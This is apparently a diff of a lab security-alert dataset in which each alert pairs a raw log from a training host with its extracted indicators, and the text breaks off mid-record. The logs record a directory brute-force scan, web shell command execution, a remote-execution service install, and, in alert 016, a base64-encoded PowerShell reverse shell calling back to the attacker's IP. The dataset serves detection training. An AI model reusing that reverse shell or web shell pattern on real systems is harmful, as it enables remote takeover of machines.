@@ -4,8 +4,16 @@
     "alert_name": "Web directory brute-force scan detected (feroxbuster)",
     "raw_log": "192.168.56.129 - - [24/Dec/2024:08:47:37 -0800] \"GET /zzstyles.jsp HTTP/1.1\" 404 300 \"-\" \"feroxbuster/2.11.0\"",
     "indicators": [
-      { "type": "ip", "value": "192.168.56.129", "source": "src_ip" },
-      { "type": "url", "value": "/zzstyles.jsp", "source": "uri_path" }
+      {
+        "type": "ip",
+        "value": "192.168.56.129",
+        "source": "src_ip"
+      },
+      {
+        "type": "url",
+        "value": "/zzstyles.jsp",
+        "source": "uri_path"
+      }
     ]
   },
   {
@@ -13,8 +21,16 @@
     "alert_name": "Possible web shell upload and command execution on web server",
     "raw_log": "192.168.56.129 - - [24/Dec/2024:08:44:15 -0800] \"GET /uploads/php-webshell.php?cmd=whoami HTTP/1.1\" 200 26 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
     "indicators": [
-      { "type": "ip", "value": "192.168.56.129", "source": "src_ip" },
-      { "type": "url", "value": "/uploads/php-webshell.php?cmd=whoami", "source": "uri" }
+      {
+        "type": "ip",
+        "value": "192.168.56.129",
+        "source": "src_ip"
+      },
+      {
+        "type": "url",
+        "value": "/uploads/php-webshell.php?cmd=whoami",
+        "source": "uri"
+      }
     ]
   },
   {
@@ -22,9 +38,21 @@
     "alert_name": "Suspicious Windows service installed on endpoint (EventCode 7045)",
     "raw_log": "12/24/2024 09:01:41 AM\nLogName=System\nEventCode=7045\nEventType=4\nComputerName=KBTG-Bootcamp\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1826897636-2806653855-114302692-1000\nSidType=0\nSourceName=Microsoft-Windows-Service Control Manager\nType=Information\nRecordNumber=3768\nKeywords=Classic\nTaskCategory=None\nOpCode=The operation completed successfully.\nMessage=A service was installed in the system.\n\nService Name:  jQTS\nService File Name:  %systemroot%\\PKSnPlKq.exe\nService Type:  user mode service\nService Start Type:  demand start\nService Account:  LocalSystem",
     "indicators": [
-      { "type": "host", "value": "KBTG-Bootcamp", "source": "ComputerName" },
-      { "type": "service", "value": "jQTS", "source": "ServiceName" },
-      { "type": "process", "value": "PKSnPlKq.exe", "source": "ServiceFileName" }
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "ComputerName"
+      },
+      {
+        "type": "service",
+        "value": "jQTS",
+        "source": "ServiceName"
+      },
+      {
+        "type": "process",
+        "value": "PKSnPlKq.exe",
+        "source": "ServiceFileName"
+      }
     ]
   },
   {
@@ -32,9 +60,21 @@
     "alert_name": "Command shell (cmd.exe) spawned by PKSnPlKq.exe as SYSTEM (Sysmon EventID 1)",
     "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:01:41.1280062Z'/><EventRecordID>44883</EventRecordID><Correlation/><Execution ProcessID='4600' ThreadID='1452'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>KBTG-Bootcamp</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:01:41.124</Data><Data Name='ProcessGuid'>{679a8f89-e8f5-676a-3807-000000000c00}</Data><Data Name='ProcessId'>1208</Data><Data Name='Image'>C:\\Windows\\SysWOW64\\cmd.exe</Data><Data Name='FileVersion'>10.0.20348.2849 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>cmd.exe</Data><Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data><Data Name='LogonGuid'>{679a8f89-83c2-676a-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=A7735F9E67DAC28F91F4925B04C3D1E2,SHA256=07D4A98BB28273881DB3F9841EF3A3484D5EDF8AD43F64085C1C6CA1F8C41DC9,IMPHASH=63B6D640EF299E8F8898CEA09B8AA342</Data><Data Name='ParentProcessGuid'>{679a8f89-e8f5-676a-3707-000000000c00}</Data><Data Name='ParentProcessId'>6216</Data><Data Name='ParentImage'>C:\\Windows\\PKSnPlKq.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\PKSnPlKq.exe</Data><Data Name='ParentUser'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
     "indicators": [
-      { "type": "host", "value": "KBTG-Bootcamp", "source": "Computer" },
-      { "type": "process", "value": "C:\\Windows\\PKSnPlKq.exe", "source": "ParentImage" },
-      { "type": "hash", "value": "07D4A98BB28273881DB3F9841EF3A3484D5EDF8AD43F64085C1C6CA1F8C41DC9", "source": "Hashes" }
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "Computer"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Windows\\PKSnPlKq.exe",
+        "source": "ParentImage"
+      },
+      {
+        "type": "hash",
+        "value": "07D4A98BB28273881DB3F9841EF3A3484D5EDF8AD43F64085C1C6CA1F8C41DC9",
+        "source": "Hashes"
+      }
     ]
   },
   {
@@ -42,10 +82,769 @@
     "alert_name": "Successful NTLM network logon (Logon Type 3) from external source IP",
     "raw_log": "12/24/2024 09:04:26 AM\nLogName=Security\nEventCode=4624\nEventType=0\nComputerName=KBTG-Bootcamp\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=16142\nKeywords=Audit Success\nTaskCategory=Logon\nOpCode=Info\nMessage=An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nImpersonation Level:\t\tImpersonation\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1826897636-2806653855-114302692-1000\n\tAccount Name:\t\tvanitas\n\tAccount Domain:\t\tKBTG-BOOTCAMP\n\tLogon ID:\t\t0x55C21E7\n\tLinked Logon ID:\t\t0x0\n\tNetwork Account Name:\t-\n\tNetwork Account Domain:\t-\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\n\nProcess Information:\n\tProcess ID:\t\t0x0\n\tProcess Name:\t\t-\n\nNetwork Information:\n\tWorkstation Name:\t-\n\tSource Network Address:\t192.168.56.129\n\tSource Port:\t\t36848\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tTransited Services:\t-\n\tPackage Name (NTLM only):\tNTLM V2\n\tKey Length:\t\t0",
     "indicators": [
-      { "type": "ip", "value": "192.168.56.129", "source": "SourceNetworkAddress" },
-      { "type": "user", "value": "vanitas", "source": "AccountName" },
-      { "type": "host", "value": "KBTG-Bootcamp", "source": "ComputerName" }
+      {
+        "type": "ip",
+        "value": "192.168.56.129",
+        "source": "SourceNetworkAddress"
+      },
+      {
+        "type": "user",
+        "value": "vanitas",
+        "source": "AccountName"
+      },
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "ComputerName"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-006",
+    "alert_name": "Web - UC-WEB-001 - Directory Brute Force Detected - Rule",
+    "raw_log": "192.168.56.129 - - [24/Dec/2024:08:46:50 -0800] \"GET /com8 HTTP/1.1\" 403 303 \"-\" \"feroxbuster/2.11.0\"",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "192.168.56.129",
+        "source": "src_ip"
+      },
+      {
+        "type": "url",
+        "value": "/com8",
+        "source": "uri_path"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-007",
+    "alert_name": "Web - UC-WEB-002 - Web Shell Access Detected - Rule",
+    "raw_log": "192.168.56.129 - - [24/Dec/2024:08:46:38 -0800] \"GET /UpLoads/php-webshell.php HTTP/1.1\" 200 42 \"-\" \"feroxbuster/2.11.0\"",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "192.168.56.129",
+        "source": "src_ip"
+      },
+      {
+        "type": "url",
+        "value": "/UpLoads/php-webshell.php",
+        "source": "uri_path"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-008",
+    "alert_name": "File upload via POST to web application upload page",
+    "raw_log": "192.168.56.129 - - [24/Dec/2024:08:43:59 -0800] \"POST /uploads.php HTTP/1.1\" 200 2435 \"http://192.168.56.132/uploads.php\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "192.168.56.129",
+        "source": "src_ip"
+      },
+      {
+        "type": "url",
+        "value": "/uploads.php",
+        "source": "uri_path"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-009",
+    "alert_name": "Malformed HTTP request with empty User-Agent",
+    "raw_log": "192.168.56.129 - - [24/Dec/2024:08:44:25 -0800] \"GET /#wp-config.php# HTTP/1.1\" 400 325 \"-\" \"-\"",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "192.168.56.129",
+        "source": "src_ip"
+      },
+      {
+        "type": "url",
+        "value": "/#wp-config.php#",
+        "source": "uri_path"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-010",
+    "alert_name": "Endpoint - UC-EDR-001 - Suspicious Service Installed - Rule",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:01:41.0686971Z'/><EventRecordID>44874</EventRecordID><Correlation/><Execution ProcessID='4600' ThreadID='1452'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>KBTG-Bootcamp</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:01:41.064</Data><Data Name='ProcessGuid'>{679a8f89-e8f5-676a-3707-000000000c00}</Data><Data Name='ProcessId'>6216</Data><Data Name='Image'>C:\\Windows\\PKSnPlKq.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>C:\\Windows\\PKSnPlKq.exe</Data><Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data><Data Name='LogonGuid'>{679a8f89-83c2-676a-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=6983F7001DE10F4D19FC2D794C3EB534,SHA256=3C2FE308C0A563E06263BBACF793BBE9B2259D795FCC36B953793A7E499E7F71,IMPHASH=4749670AC3D28D6761142B0DCB4F5076</Data><Data Name='ParentProcessGuid'>{679a8f89-83c2-676a-0b00-000000000c00}</Data><Data Name='ParentProcessId'>620</Data><Data Name='ParentImage'>C:\\Windows\\System32\\services.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\system32\\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "Computer"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Windows\\PKSnPlKq.exe",
+        "source": "Image"
+      },
+      {
+        "type": "hash",
+        "value": "3C2FE308C0A563E06263BBACF793BBE9B2259D795FCC36B953793A7E499E7F71",
+        "source": "Hashes"
+      },
+      {
+        "type": "user",
+        "value": "SYSTEM",
+        "source": "User"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-011",
+    "alert_name": "Executable file created in Windows directory (Sysmon EventID 11)",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:01:40.9972001Z'/><EventRecordID>44871</EventRecordID><Correlation/><Execution ProcessID='4600' ThreadID='1452'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>KBTG-Bootcamp</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2024-12-24 17:01:40.995</Data><Data Name='ProcessGuid'>{679a8f89-83bf-676a-eb03-000000000000}</Data><Data Name='ProcessId'>4</Data><Data Name='Image'>System</Data><Data Name='TargetFilename'>C:\\Windows\\PKSnPlKq.exe</Data><Data Name='CreationUtcTime'>2024-12-24 17:01:40.995</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "Computer"
+      },
+      {
+        "type": "file",
+        "value": "C:\\Windows\\PKSnPlKq.exe",
+        "source": "TargetFilename"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-012",
+    "alert_name": "Named pipe created by remote execution tool (Sysmon EventID 17)",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>17</EventID><Version>1</Version><Level>4</Level><Task>17</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:01:41.0940648Z'/><EventRecordID>44879</EventRecordID><Correlation/><Execution ProcessID='4600' ThreadID='1452'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>KBTG-Bootcamp</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreatePipe</Data><Data Name='UtcTime'>2024-12-24 17:01:41.089</Data><Data Name='ProcessGuid'>{679a8f89-e8f5-676a-3707-000000000c00}</Data><Data Name='ProcessId'>6216</Data><Data Name='PipeName'>\\RemCom_stdinNOfi576898</Data><Data Name='Image'>C:\\Windows\\PKSnPlKq.exe</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "Computer"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Windows\\PKSnPlKq.exe",
+        "source": "Image"
+      },
+      {
+        "type": "pipe",
+        "value": "\\RemCom_stdinNOfi576898",
+        "source": "PipeName"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-013",
+    "alert_name": "Discovery command whoami executed as SYSTEM (Sysmon EventID 1)",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:01:45.8514402Z'/><EventRecordID>44886</EventRecordID><Correlation/><Execution ProcessID='4600' ThreadID='1452'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>KBTG-Bootcamp</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:01:45.849</Data><Data Name='ProcessGuid'>{679a8f89-e8f9-676a-3a07-000000000c00}</Data><Data Name='ProcessId'>1244</Data><Data Name='Image'>C:\\Windows\\SysWOW64\\whoami.exe</Data><Data Name='FileVersion'>10.0.20348.1 (WinBuild.160101.0800)</Data><Data Name='Description'>whoami - displays logged on user information</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>whoami.exe</Data><Data Name='CommandLine'>whoami</Data><Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data><Data Name='LogonGuid'>{679a8f89-83c2-676a-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=54A7DCA405C6B9055CA032D330BB6BC5,SHA256=DE913B2FFE3DA61013CEE91B21D1CE3091579401299DFAACE9016577A1B15A0E,IMPHASH=505871A09E1EEB12F301671252C611BE</Data><Data Name='ParentProcessGuid'>{679a8f89-e8f5-676a-3807-000000000c00}</Data><Data Name='ParentProcessId'>1208</Data><Data Name='ParentImage'>C:\\Windows\\SysWOW64\\cmd.exe</Data><Data Name='ParentCommandLine'>cmd.exe</Data><Data Name='ParentUser'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "Computer"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Windows\\SysWOW64\\whoami.exe",
+        "source": "Image"
+      },
+      {
+        "type": "hash",
+        "value": "DE913B2FFE3DA61013CEE91B21D1CE3091579401299DFAACE9016577A1B15A0E",
+        "source": "Hashes"
+      },
+      {
+        "type": "user",
+        "value": "SYSTEM",
+        "source": "User"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-014",
+    "alert_name": "NTLM credential validation for local account (EventCode 4776)",
+    "raw_log": "12/24/2024 09:04:26 AM\nLogName=Security\nEventCode=4776\nEventType=0\nComputerName=KBTG-Bootcamp\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=16140\nKeywords=Audit Success\nTaskCategory=Credential Validation\nOpCode=Info\nMessage=The computer attempted to validate the credentials for an account.\n\nAuthentication Package:\tMICROSOFT_AUTHENTICATION_PACKAGE_V1_0\nLogon Account:\tvanitas\nSource Workstation:\t\nError Code:\t0x0",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "ComputerName"
+      },
+      {
+        "type": "user",
+        "value": "vanitas",
+        "source": "Logon_Account"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-015",
+    "alert_name": "Special privileges assigned to new logon (EventCode 4672)",
+    "raw_log": "12/24/2024 09:04:26 AM\nLogName=Security\nEventCode=4672\nEventType=0\nComputerName=KBTG-Bootcamp\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=16141\nKeywords=Audit Success\nTaskCategory=Special Logon\nOpCode=Info\nMessage=Special privileges assigned to new logon.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-1826897636-2806653855-114302692-1000\n\tAccount Name:\t\tvanitas\n\tAccount Domain:\t\tKBTG-BOOTCAMP\n\tLogon ID:\t\t0x55C21E7\n\nPrivileges:\t\tSeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeImpersonatePrivilege\n\t\t\tSeDelegateSessionUserImpersonatePrivilege",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "ComputerName"
+      },
+      {
+        "type": "user",
+        "value": "vanitas",
+        "source": "Account_Name"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-016",
+    "alert_name": "MySQL client executed with empty root password from PowerShell",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:00:02.8371165Z'/><EventRecordID>44858</EventRecordID><Correlation/><Execution ProcessID='4600' ThreadID='1452'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>KBTG-Bootcamp</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:00:02.835</Data><Data Name='ProcessGuid'>{679a8f89-e892-676a-2a07-000000000c00}</Data><Data Name='ProcessId'>5136</Data><Data Name='Image'>C:\\xampp\\mysql\\bin\\mysql.exe</Data><Data Name='FileVersion'>10.4.32.0</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>\"C:\\xampp\\mysql\\bin\\mysql.exe\" -u root --password= -e \"use kbtg; select * from flag;\"</Data><Data Name='CurrentDirectory'>C:\\xampp\\</Data><Data Name='User'>KBTG-BOOTCAMP\\chananya.c</Data><Data Name='LogonGuid'>{679a8f89-83c3-676a-4af2-010000000000}</Data><Data Name='LogonId'>0x1f24a</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=803CA14F7706CAFA404EE4E48766D379,SHA256=A60D3CBC24984E3C1C5DEE3726ABC685EC6FFF58BCE3FBD763F9261C652FB73D,IMPHASH=4E752061687E0C5FFF6BDDCA7C32A246</Data><Data Name='ParentProcessGuid'>{679a8f89-e502-676a-ad06-000000000c00}</Data><Data Name='ParentProcessId'>4288</Data><Data Name='ParentImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='ParentCommandLine'>powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADEAMgA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</Data><Data Name='ParentUser'>KBTG-BOOTCAMP\\chananya.c</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "Computer"
+      },
+      {
+        "type": "process",
+        "value": "C:\\xampp\\mysql\\bin\\mysql.exe",
+        "source": "Image"
+      },
+      {
+        "type": "hash",
+        "value": "A60D3CBC24984E3C1C5DEE3726ABC685EC6FFF58BCE3FBD763F9261C652FB73D",
+        "source": "Hashes"
+      },
+      {
+        "type": "user",
+        "value": "chananya.c",
+        "source": "User"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-017",
+    "alert_name": "Service logon by SYSTEM account (EventCode 4624 Logon Type 5)",
+    "raw_log": "12/24/2024 09:58:06 AM\nLogName=Security\nEventCode=4624\nEventType=0\nComputerName=KBTG-Bootcamp\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=16156\nKeywords=Audit Success\nTaskCategory=Logon\nOpCode=Info\nMessage=An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tKBTG-BOOTCAMP$\n\tAccount Domain:\t\tWORKGROUP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t5\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nImpersonation Level:\t\tImpersonation\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tSYSTEM\n\tAccount Domain:\t\tNT AUTHORITY\n\tLogon ID:\t\t0x3E7\n\tLinked Logon ID:\t\t0x0\n\tNetwork Account Name:\t-\n\tNetwork Account Domain:\t-\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\n\nProcess Information:\n\tProcess ID:\t\t0x26c\n\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\n\nNetwork Information:\n\tWorkstation Name:\t-\n\tSource Network Address:\t-\n\tSource Port:\t\t-\n\nDetailed Authentication Information:\n\tLogon Process:\t\tAdvapi  \n\tAuthentication Package:\tNegotiate\n\tTransited Services:\t-\n\tPackage Name (NTLM only):\t-\n\tKey Length:\t\t0\n\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\n\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\n\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\n\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\n\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\n\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\n\nThe authentication information fields provide detailed information about this specific logon request.\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\n\t- Transited services indicate which intermediate services have participated in this logon request.\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "ComputerName"
+      },
+      {
+        "type": "user",
+        "value": "SYSTEM",
+        "source": "Account_Name"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-018",
+    "alert_name": "PowerShell-named process started by Splunk Universal Forwarder",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:58:32.1533401Z'/><EventRecordID>45240</EventRecordID><Correlation/><Execution ProcessID='4600' ThreadID='1452'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>KBTG-Bootcamp</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:58:32.152</Data><Data Name='ProcessGuid'>{679a8f89-f648-676a-b108-000000000c00}</Data><Data Name='ProcessId'>4128</Data><Data Name='Image'>C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>\"C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powershell.exe\" --ps2</Data><Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data><Data Name='LogonGuid'>{679a8f89-83c2-676a-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data 